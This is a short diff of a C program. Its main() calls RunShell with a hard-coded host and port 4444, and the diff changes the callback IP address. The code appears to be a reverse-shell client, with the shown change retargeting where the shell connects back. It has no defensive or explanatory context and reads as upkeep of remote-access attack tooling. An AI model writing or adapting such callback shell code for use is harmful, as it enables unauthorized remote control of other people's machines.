@@ -119,7 +119,7 @@ int main(int argc, char **argv) {
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "192.168.1.26";
+        char host[] = "10.0.40.198";
         int port = 4444;
         RunShell(host, port);
     }
